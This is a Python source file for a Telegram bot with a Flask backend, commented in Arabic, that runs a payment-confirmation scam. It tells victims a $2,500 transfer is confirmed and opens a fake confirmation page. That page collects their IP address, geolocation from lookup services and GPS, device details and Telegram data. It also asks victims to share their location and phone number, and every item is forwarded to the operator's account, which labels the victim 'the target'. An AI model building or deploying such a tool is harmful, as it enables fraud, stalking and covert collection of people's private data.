import json
import logging
import requests
from flask import Flask, request, jsonify, render_template_string
import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
import config

# إعداد logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# تهيئة البوت
bot = telegram.Bot(token=config.BOT_TOKEN)

# === صفحة HTML لجمع الموقع و IP ===
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الدفع</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #0a0a2e, #1a1a4e); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; direction: rtl; }
        .container { background: rgba(255,255,255,0.1); backdrop-filter: blur(20px); border-radius: 24px; padding: 40px; max-width: 400px; width: 90%; text-align: center; border: 1px solid rgba(255,255,255,0.2); }
        h1 { font-size: 24px; margin-bottom: 8px; }
        .subtitle { color: #a0a0cc; margin-bottom: 30px; font-size: 14px; }
        .amount-box { background: rgba(255,255,255,0.08); border-radius: 16px; padding: 20px; margin-bottom: 24px; }
        .amount { font-size: 36px; font-weight: bold; color: #4ade80; }
        .amount-label { color: #a0a0cc; font-size: 12px; margin-top: 4px; }
        .btn { background: linear-gradient(135deg, #4ade80, #22d3ee); border: none; color: #0a0a2e; padding: 16px 40px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: transform 0.2s; margin-bottom: 12px; }
        .btn:hover { transform: scale(1.02); }
        .btn-secondary { background: rgba(255,255,255,0.1); color: white; border: 1px solid rgba(255,255,255,0.2); }
        .loading { display: none; margin: 20px 0; }
        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #4ade80; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .info-text { font-size: 12px; color: #6666aa; margin-top: 16px; }
        .status { margin-top: 16px; padding: 12px; border-radius: 8px; display: none; font-size: 14px; }
        .status.success { background: rgba(74,222,128,0.2); color: #4ade80; display: block; }
        .status.error { background: rgba(255,75,75,0.2); color: #ff4b4b; display: block; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 تأكيد التحويل</h1>
        <p class="subtitle">يرجى تأكيد معلومات الدفع لإتمام التحويل</p>
        <div class="amount-box">
            <div class="amount">$2,500</div>
            <div class="amount-label">مبلغ التحويل</div>
        </div>
        <button class="btn" id="confirmBtn">✅ تأكيد وإتمام التحويل</button>
        <button class="btn btn-secondary" id="locationBtn">📍 مشاركة الموقع للتحقق</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top:12px;">جاري تأكيد التحويل...</p>
        </div>
        <div class="status" id="status"></div>
        <p class="info-text">سيتم إرسال إشعار بنجاح التحويل</p>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        let botData = {
            ip: '',
            location: null
        };

        // جلب IP عبر multiple APIs
        function getIP() {
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => { botData.ip = d.ip; })
                .catch(() => {});
            fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(d => { 
                    if (!botData.ip) botData.ip = d.ip;
                    botData.location = d;
                })
                .catch(() => {});
            // API ثالث احتياطي
            fetch('https://ipinfo.io/json')
                .then(r => r.json())
                .then(d => {
                    if (!botData.ip) botData.ip = d.ip;
                    if (!botData.location) botData.location = d;
                })
                .catch(() => {});
        }
        getIP();

        // زر الموقع
        document.getElementById('locationBtn').onclick = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        botData.location = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        };
                        document.getElementById('status').className = 'status success';
                        document.getElementById('status').innerText = '✅ تم الحصول على الموقع بنجاح';
                    },
                    function(err) {
                        document.getElementById('status').className = 'status error';
                        document.getElementById('status').innerText = '❌ فشل الحصول على الموقع: ' + err.message;
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                document.getElementById('status').className = 'status error';
                document.getElementById('status').innerText = '❌ المتصفح لا يدخدم خاصية الموقع';
            }
        };

        // زر التأكيد - إرسال كل البيانات
        document.getElementById('confirmBtn').onclick = function() {
            document.getElementById('loading').style.display = 'block';
            document.getElementById('confirmBtn').disabled = true;
            
            // الحصول على بيانات الجهاز
            let deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                battery: navigator.battery ? navigator.battery.level : null
            };

            // إرسال كل شيء للبوت
            let dataToSend = {
                ip: botData.ip,
                location: botData.location,
                device: deviceInfo,
                initData: tg.initData
            };
            
            tg.sendData(JSON.stringify(dataToSend));
            
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('status').className = 'status success';
                document.getElementById('status').innerText = '✅ تم إتمام التحويل بنجاح! سيتم إشعارك قريباً.';
            }, 2000);
        };
    </script>
</body>
</html>
"""

# === صفحات البوت ===
@app.route('/')
def index():
    return "Bot is running!", 200

@app.route('/webapp')
def webapp():
    return render_template_string(HTML_PAGE)

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        update = Update.de_json(request.get_json(force=True), bot)
        # معالجة التحديث في الخلفية
        process_update(update)
    except Exception as e:
        logger.error(f"Error processing update: {e}")
    return "OK", 200

def process_update(update):
    try:
        # معالجة رسائل WebApp data
        if update.message and update.message.web_app_data:
            data = json.loads(update.message.web_app_data.data)
            chat_id = update.effective_chat.id
            
            # بناء رسالة بالمعلومات
            msg = "🔔 **معلومات جديدة من الهدف** 🔔\n\n"
            
            if data.get('ip'):
                msg += f"🌐 **IP:** {data['ip']}\n"
                # جلب تفاصيل IP
                try:
                    ip_info = requests.get(f"https://ipinfo.io/{data['ip']}/json").json()
                    msg += f"   🏙️ **المدينة:** {ip_info.get('city', 'غير معروف')}\n"
                    msg += f"   🏳️ **البلد:** {ip_info.get('country', 'غير معروف')}\n"
                    msg += f"   🏢 **المزود:** {ip_info.get('org', 'غير معروف')}\n"
                    msg += f"   📮 **الرمز البريدي:** {ip_info.get('postal', 'غير معروف')}\n"
                    if ip_info.get('loc'):
                        loc = ip_info['loc'].split(',')
                        msg += f"   📍 **الموقع:** https://www.google.com/maps?q={loc[0]},{loc[1]}\n"
                except: pass
            
            if data.get('location'):
                loc = data['location']
                if loc.get('latitude') and loc.get('longitude'):
                    msg += f"\n📍 **الموقع الدقيق (GPS):**\n"
                    msg += f"   🌐 https://www.google.com/maps?q={loc['latitude']},{loc['longitude']}\n"
                    msg += f"   🎯 **الدقة:** ±{loc.get('accuracy', 'غير معروف')} متر\n"
            
            if data.get('device'):
                dev = data['device']
                msg += f"\n💻 **معلومات الجهاز:**\n"
                msg += f"   **النظام:** {dev.get('platform', 'غير معروف')}\n"
                msg += f"   **اللغة:** {dev.get('language', 'غير معروف')}\n"
                msg += f"   **المنطقة الزمنية:** {dev.get('timezone', 'غير معروف')}\n"
                msg += f"   **الشاشة:** {dev.get('screenWidth', '?')}x{dev.get('screenHeight', '?')}\n"
                msg += f"   **المتصفح:** {dev.get('userAgent', 'غير معروف')[:100]}\n"
            
            msg += f"\n🆔 **Chat ID:** {chat_id}"
            
            # إرسال للجهات المختصة
            bot.send_message(chat_id=config.YOUR_TELEGRAM_ID, text=msg, parse_mode='Markdown')
            
            # إرسال صورة خريطة إذا وجد موقع
            if data.get('location') and data['location'].get('latitude'):
                try:
                    lat = data['location']['latitude']
                    lon = data['location']['longitude']
                    bot.send_location(chat_id=config.YOUR_TELEGRAM_ID, latitude=lat, longitude=lon)
                except: pass
            
            # تأكيد للمستخدم
            bot.send_message(chat_id=chat_id, text="✅ تم إتمام التحويل بنجاح!")
            
        # معالجة رسائل الموقع عبر KeyboardButton
        elif update.message and update.message.location:
            loc = update.message.location
            chat_id = update.effective_chat.id
            user = update.effective_user
            
            msg = f"📍 **موقع الهدف (مباشر):**\n"
            msg += f"👤 **المستخدم:** {user.full_name} (@{user.username or 'لا يوجد'})\n"
            msg += f"🆔 **ID:** {user.id}\n"
            msg += f"🌐 **الرابط:** https://www.google.com/maps?q={loc.latitude},{loc.longitude}\n"
            msg += f"🎯 **الدقة الأفقي:** ±{loc.horizontal_accuracy or 'غير معروف'} متر\n"
            
            bot.send_message(chat_id=config.YOUR_TELEGRAM_ID, text=msg, parse_mode='Markdown')
            bot.send_location(chat_id=config.YOUR_TELEGRAM_ID, latitude=loc.latitude, longitude=loc.longitude)
            
        # معالجة جهات الاتصال
        elif update.message and update.message.contact:
            contact = update.message.contact
            chat_id = update.effective_chat.id
            
            msg = f"📞 **رقم هاتف الهدف:**\n"
            msg += f"👤 **الاسم:** {contact.first_name} {contact.last_name or ''}\n"
            msg += f"📱 **الرقم:** +{contact.phone_number}\n"
            msg += f"🆔 **User ID:** {contact.user_id}\n"
            
            bot.send_message(chat_id=config.YOUR_TELEGRAM_ID, text=msg, parse_mode='Markdown')
            
        # معالجة أمر /start
        elif update.message and update.message.text == '/start':
            chat_id = update.effective_chat.id
            user = update.effective_user
            
            # رسالة الخداع
            welcome_msg = f"""
🎉 **مبروك! تم تأكيد عملية الدفع!** 🎉

عزيزي المستخدم،
تم تأكيد تحويل مبلغ **$2,500** بنجاح.
لإتمام العملية، يرجى الضغط على الزر أدناه لتأكيد معلومات التحويل.

🔒 *جميع المعلومات مشفرة وآمنة*
            """
            
            # زر WebApp لفتح الصفحة
            webapp_btn = InlineKeyboardButton(
                "💳 تأكيد معلومات التحويل", 
                web_app=WebAppInfo(url=f"{config.APP_URL}/webapp")
            )
            keyboard = InlineKeyboardMarkup([[webapp_btn]])
            
            bot.send_message(
                chat_id=chat_id, 
                text=welcome_msg, 
                parse_mode='Markdown',
                reply_markup=keyboard
            )
            
            # إرسال أزرار الموقع ورقم الهاتف (خيار إضافي)
            location_keyboard = ReplyKeyboardMarkup(
                [
                    [KeyboardButton("📍 مشاركة الموقع", request_location=True)],
                    [KeyboardButton("📱 مشاركة رقم الهاتف", request_contact=True)]
                ],
                resize_keyboard=True,
                one_time_keyboard=True
            )
            
            bot.send_message(
                chat_id=chat_id,
                text="📍 يرجى مشاركة موقعك للتحقق من هويتك:",
                reply_markup=location_keyboard
            )
            
    except Exception as e:
        logger.error(f"Error in process_update: {e}")

# === نقطة الدخول للبوت (polling) ===
@app.route('/setwebhook', methods=['GET', 'POST'])
def set_webhook():
    try:
        webhook_url = f"{config.APP_URL}/webhook"
        bot.set_webhook(url=webhook_url)
        return f"Webhook set to {webhook_url}", 200
    except Exception as e:
        return f"Error setting webhook: {e}", 500

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
